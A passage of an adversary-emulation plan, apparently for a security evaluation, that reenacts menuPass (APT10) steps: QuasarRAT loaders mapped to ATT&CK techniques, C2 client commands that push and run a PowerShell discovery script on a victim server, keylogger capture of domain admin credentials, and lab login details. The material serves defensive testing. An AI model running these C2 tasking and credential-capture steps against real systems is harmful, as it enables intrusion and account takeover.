<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1027.009 Obfuscated Files or Information: Embedded Payloads</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files&#x27; signatures are still valid</td>
<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1553.002 Subvert Trust Controls: Code Signing</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with." class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute Notepad++.exe to perform DLL sideloading</td>
<td>-</td>
<td>T1574.002 Hijack Execution Flow: DLL Side-Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader decrypts shellcode (combination of XOR/AES/DES)</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L272">decrypt</a></td>
<td>T1140 Deobfuscate/Decode Files or Information</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader reflectively loads and executes FYAnti</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L75">run_code</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=Ecipekac%20uses%20a%20new%2C%20complicated%20loading%20schema" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FYAnti contains an embedded .NET assembly</td>
<td><a href="../../resources/fyanti/src/native-loader/main.cpp#L7-L19">embedded.hpp</a></td>
<td>T1027.009 Obfuscated Files or Information: Embedded Payloads</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr</td>
<td><a href="../../resources/fyanti/src/native-loader/main.cpp#L36-L48">execute_ssembly</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader is obfuscated using ConfuserEx</td>
<td><a href="../../resources/fyanti/src/managed-loader/confusersettings.crproj.in">ConfuserEx Settings</a></td>
<td>T1027.002 Obfuscated Files or Information: Software Packing</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader decrypts QuasarRAT</td>
<td><a href="../../resources/fyanti/src/managed-loader/main.cs#L159">Decrypt</a></td>
<td>T1140 Deobfuscate/Decode Files or Information</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader loads and executes QuasarRAT</td>
<td><a href="../../resources/fyanti/src/managed-loader/main.cs#L59-L70">FindModule, Invoke</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT communicates over TCP</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L269">Connect</a></td>
<td>T1095 Non-Application Layer Protocol</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT C2 communications use TLS</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L283-L284">SslStream</a></td>
<td>T1573.002 Encrypted Channel: Asymmetric Cryptography</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT C2 communications are encrypted with symmetric encryption</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L283-L292">Connect</a></td>
<td>T1573.001 Encrypted Channel: Symmetric Cryptography</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT starts keylogging</td>
<td><a href="../../resources/quasar/quasar.client/logging/keylogger.cs">Keylogger</a></td>
<td>T1056.001 Input Capture: Keylogging</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-2---initial-discovery">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---initial-discovery">#</doc-anchor-trigger>
        <span>Step 2 - Initial Discovery</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>After establishing communications with the C2 server, menuPass will use
QuasarRAT to execute scripted discovery actions and discover the presence of a
domain controller on Subsidiary A’s network.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using QuasarRAT, download the PowerShell discovery script to the IIS Server</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\step2discovery.ps1&quot;, &quot;transfer_dst&quot;: &quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using QuasarRAT, execute the PowerShell discovery script</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;powershell.exe&quot;, &quot;proc_args&quot;: &quot;\&quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1\&quot;&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor">https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor</a></li>
<li><a href="https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934">https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934</a></li>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-">https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-</a></li>
<li><a href="https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10">https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>QuasarRAT execute commands</td>
<td><a href="../../resources/quasar/quasar.client/messages/taskmanagerhandler.cs#L179">ExecuteProcess</a></td>
<td>T1106 Native API</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT executes PowerShell discovery script</td>
<td><a href="../../resources/quasar/quasar.client/messages/taskmanagerhandler.cs#L179">ExecuteProcess</a></td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>PowerShell script executes ipconfig /all</td>
<td><a href="../../resources/payloads/quasar/step2discovery.ps1">step2discovery.ps1</a></td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>PowerShell script executes nslookup</td>
<td><a href="../../resources/payloads/quasar/step2discovery.ps1">step2discovery.ps1</a></td>
<td>T1016 System Network Configuration Discovery</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-3---credential-access-and-privilege-escalation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---credential-access-and-privilege-escalation">#</doc-anchor-trigger>
        <span>Step 3 - Credential Access and Privilege Escalation</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Eventually, the IIS Server admin logs in to the IIS Server <code v-pre>gabumon (10.10.10.9)</code>.
While performing tasks, they eventually need to type in their Domain Admin
credentials. Using QuasarRAT&#x27;s keylogger utility, menuPass captures the domain
admin credentials.</p>
<p>menuPass initiates a new RDP to the IIS server <code v-pre>gabumon (10.10.10.9)</code> using
the compromised credentials from Step 1.</p>
<p>Using the RDP to the IIS Server <code v-pre>gabumon (10.10.10.9)</code>, menuPass opens
PowerShell with administrative privileges and authenticates using the domain
admin&#x27;s credentials.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x23E9;</span> Emulate the following legitimate user activity:</p>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> initiate an RDP session from the jumpbox <code v-pre>homelander (176.59.17.22)</code> to <code v-pre>gabumon (10.10.10.9)</code> as the IIS Admin:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIGIRUNAWAY\kizumi</td>
<td>ydJEeqNzN4Xqkd9h@</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Open Command Prompt with administrative privileges, execute cmd via <code v-pre>runas</code> with their Domain Admin username, <strong>typing the password when prompted</strong>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">runas /user:DIGIRUNAWAY\kizumi.da cmd</code></pre>
</doc-codeblock></div>
<ul>
<li><p><strong>Type, DO NOT copy and paste,</strong> the following when prompted:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">ydJEeqNzN4Xqkd9h@</code></pre>
</doc-codeblock></div>
</li>
</ul>
</li>
<li><p>Close the Command Prompts then <strong>disconnect</strong> from the RDP when finished. You should return to <code v-pre>homelander (116.83.1.29)</code></p>
</li>
</ul>
